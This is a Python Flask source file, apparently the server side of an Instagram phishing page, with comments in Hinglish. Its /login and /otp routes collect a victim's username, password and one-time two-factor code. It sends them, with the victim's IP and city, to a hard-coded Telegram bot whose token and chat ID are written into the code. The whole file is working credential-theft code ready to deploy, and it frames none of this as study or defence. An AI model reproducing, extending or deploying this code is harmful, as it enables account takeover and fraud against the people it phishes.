from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

# Aapka Telegram Config
BOT_TOKEN = "9080865353:AAGA3hZrQzPhJWcNHAuY5Wg-wHOxsrpNznk"
CHAT_ID = "8741170935"

# Data store karne ke liye (Temporary)
captured_data = {}

def send_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # IP aur Device info lo
    try:
        ip_res = requests.get("https://ipapi.co/json/").json()
        ip_info = f"🌍 IP: {ip_res['ip']} ({ip_res['city']})"
    except:
        ip_info = "IP Unknown"

    msg = (
        f"🔥 *LOGIN STEP 1* 🔥\n\n"
        f"👤 User: <b>{username}</b>\n"
        f"🔑 Pass: <b>{password}</b>\n"
        f"{ip_info}\n\n"
        f"⚠️ Check your phone for the OTP sent by Instagram!"
    )
    
    send_telegram(msg)
    captured_data['username'] = username
    captured_data['password'] = password
    
    return "Success" # User ko page reload nahi hoga, bas data bhej diya

@app.route('/otp', methods=['POST'])
def otp():
    user_otp = request.form.get('otp')
    
    msg = (
        f"✅ *OTP RECEIVED* ✅\n\n"
        f"🔢 Code: <b>{user_otp}</b>\n"
        f"👤 User: {captured_data.get('username', 'Unknown')}\n\n"
        f"🎉 Login Successful!"
    )
    
    send_telegram(msg)
    return "Success"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
